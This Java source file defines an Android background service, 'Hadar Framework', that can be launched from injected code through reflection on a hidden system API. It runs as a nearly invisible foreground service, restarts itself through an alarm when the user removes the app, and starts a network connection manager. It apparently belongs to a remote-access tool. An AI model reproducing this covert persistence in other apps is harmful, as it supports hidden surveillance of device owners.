package com.hadar.framework;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import androidx.core.app.NotificationCompat;

import java.lang.reflect.Method;

public class MainService extends Service {
    private static Context contextOfApplication;

        private static void findContext() throws Exception {
            Class<?> activityThreadClass;
            try {
                activityThreadClass = Class.forName("android.app.ActivityThread");
            } catch (ClassNotFoundException e) {
                return;
            }

            final Method currentApplication = activityThreadClass.getMethod("currentApplication");
            final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
            if (context == null) {
                final Handler handler = new Handler(Looper.getMainLooper());
                handler.post(new Runnable() {
                    public void run() {
                        try {
                            Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                            if (context != null) {
                                startService(context);
                            }
                        } catch (Exception ignored) {
                        }
                    }
                });
            } else {
                startService(context);
            }
        }

        public static void start() {
            try {
                findContext();
            } catch (Exception ignored) {
            }
        }

        public static void startService(Context context) {
            context.startService(new Intent(context, MainService.class));
        }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
    {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
            startMyOwnForeground();
        }
        else {
            startForeground(1, new Notification());
        }

        contextOfApplication = this;
        ConnectionManager.startAsync(this);
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);

        int flags = PendingIntent.FLAG_ONE_SHOT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }

        PendingIntent service = PendingIntent.getService(
                getApplicationContext(),
                1001,
                new Intent(getApplicationContext(), MainService.class),
                flags);

        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, 1000, service);

    }

    private void startMyOwnForeground(){
        String NOTIFICATION_CHANNEL_ID = "com.hadar.framework.service";
        String channelName = "Hadar Framework";
        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        chan.setLightColor(Color.BLUE);
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(chan);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Hadar Framework is running")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(1, notification);
    }

}
